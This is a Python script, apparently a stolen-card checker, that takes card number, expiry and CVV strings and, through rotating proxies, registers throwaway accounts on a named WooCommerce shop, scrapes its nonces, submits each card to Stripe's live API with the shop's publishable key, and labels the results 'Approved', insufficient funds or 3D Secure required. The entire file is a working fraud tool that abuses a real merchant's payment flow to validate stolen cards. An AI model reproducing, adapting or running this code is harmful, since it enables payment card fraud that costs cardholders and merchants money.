from email import header
import json as jsondecode
from bs4 import BeautifulSoup
import ssl
import certifi
import aiohttp
import asyncio
import random
import json
async def StripeAuth(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    timeout = aiohttp.ClientTimeout(total=20)
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        cvv      = splitter[3]
        try:
            #---------------------------------REQUEST NUMERO 1------------------------------#
            #---------------------------------REQUEST NUMERO 1------------------------------#        
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Origin': 'https://greatflies.com',
                'Connection': 'keep-alive',
                'Referer': 'https://greatflies.com/my-account/',
            })
            async with session.get(url='https://greatflies.com/my-account/', proxy=str(proxyrand), timeout=timeout) as resp:
                try :          
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    noncewoo = soup.find("input", {"name": "woocommerce-register-nonce"})["value"]
                except TypeError:
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ??'
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ??'

            #---------------------------------REQUEST NUMERO 2------------------------------#
            #---------------------------------REQUEST NUMERO 2------------------------------#
            randemail = f'JianDominguezBerlan{random.randint(1000,99000)}{random.randint(1000,99000)}@gmail.com'
            data = {
                'email': randemail,
                'password': 'zqneZJKe3ATPv8C',
                'woocommerce-register-nonce': noncewoo,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            async with session.post('https://greatflies.com/my-account/', data=data, proxy=str(proxyrand), timeout=timeout) as resp:
                try :          
                    response = await resp.text()
                except UnboundLocalError or TypeError:
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ??'  
            #---------------------------------REQUEST NUMERO 3------------------------------#
            #---------------------------------REQUEST NUMERO 3------------------------------#
            async with session.get('https://greatflies.com/my-account/add-payment-method/', proxy=str(proxyrand), timeout=timeout) as resp:
                try :
                    response = await resp.text()               
                    lines = response.split("\n")
                    for i in lines:
                        if "wc_stripe_params" in i:
                            sucio = i
                    sucio = sucio.replace('var wc_stripe_params = ',"").replace(';',"")
                    nonceaddcard = json.loads(sucio)['add_card_nonce']
                except UnboundLocalError:
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ??'  
            #---------------------------------REQUEST NUMERO 4------------------------------#
            #---------------------------------REQUEST NUMERO 4------------------------------#
            data = f'type=card&owner[name]=+&owner[email]=JianDominguezBerlan{random.randint(10000,99999)}%40gmail.com&card[number]={ccnum}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={random.randint(10,99)}db0d95-1ffe-{random.randint(10,99)}bd-b0{random.randint(10,99)}-ab8eae5f3{random.randint(100000000,999999999)}&muid=9b{random.randint(10,99)}{random.randint(10,99)}{random.randint(10,99)}-d6d8-{random.randint(10,99)}PrWcWBvSAXGj8bD2EAcwLJEf6Bkfw9Y1EknVsZCggqiNixWMwTX9HNJQ{random.randint(10,99)}FVfuLa4t8eXt1HPA1iUitADJLCoS5ua3WQRstripe.js/056868f56;+stripe-js-v3/056868f56&time_on_page={random.randint(1000,9999)}&key=pk_live_6RCx8HWsaVIgGtomdOCHX3eJ'
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
                'Accept': 'application/json',
                'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Connection': 'keep-alive',
                'Referer': 'https://js.stripe.com/',
            }
            async with session.post('https://api.stripe.com/v1/sources', proxy=str(proxyrand),headers=headers,data=data, timeout=timeout) as resp:
                try :
                    response = await resp.json()
                    responsetexto = await resp.text()
                    if int(responsetexto.find('"decline_code"')) > 0 :
                        ree = response['error']['decline_code']
                        ree = str(ree).replace('_'," ").title()
                        await session.close()
                        return ree
                    elif int(responsetexto.find('"code"')) >= 0 :
                        ree = response['error']['code']
                        ree = str(ree).replace('_'," ").title()
                        await session.close()
                        return ree
                    idstripe = response['id']
                except UnboundLocalError or TypeError:
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ??'  
            #---------------------------------REQUEST NUMERO 5------------------------------#
            #---------------------------------REQUEST NUMERO 5------------------------------#
            data = {
                'stripe_source_id': idstripe,
                'nonce': nonceaddcard,
            }
            async with session.post('https://greatflies.com/?wc-ajax=wc_stripe_create_setup_intent', data=data, proxy=str(proxyrand), timeout=timeout) as resp:
                    try :
                        response = await resp.text()
                        #await session.close()
                    except UnboundLocalError:
                        await session.close()
                        #print(f"STRIPE AUTH - {response}")
                        return 'An unexpected error occurred in request 05. It was not generated correctly. ??'
                    except TypeError:
                        await session.close()
                        #print(f"STRIPE AUTH - {response}")
                        return 'An unexpected error occurred in request 05. It was not generated correctly. ??'
            #---------------------------------REQUEST CHECKS------------------------------#
            #---------------------------------REQUEST CHECKS------------------------------#
            if int(response.find('"status":"success"')) > 0 :
                await session.close()
                return "Approved", "Approved"
            elif int(response.find('Your card has insufficient funds')) > 0 :
                responsejson = json.loads(response)
                stripemessage = responsejson['error']['message']
                await session.close()
                return "Approved", stripemessage
            elif int(response.find('stripe_3ds2_fingerprint')) > 0 :
                await session.close()
                return "stripe_3ds2_fingerprint"
            elif int(response.find('three_d_secure_redirect')) > 0 :
                await session.close()
                return "three_d_secure_redirect"
            elif int(response.find('requires_action')) > 0 :
                await session.close()
                return "3D REQUIRED"
            elif int(response.find("Your card's security code is incorrect")) > 0 :
                responsejson = json.loads(response)
                stripemessage = responsejson['error']['message']
                await session.close()
                return "Approved", stripemessage
            elif int(response.find('setup_intent_error')) > 0 :
                responsejson = json.loads(response)
                stripemessage = responsejson['error']['message']
                await session.close()
                return stripemessage
            else :
                await session.close()
                print(f"STRIPE AUTH - {response}")
                return "An unexpected error occurred in response. It was not generated correctly. ??"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ??"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ??"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ??"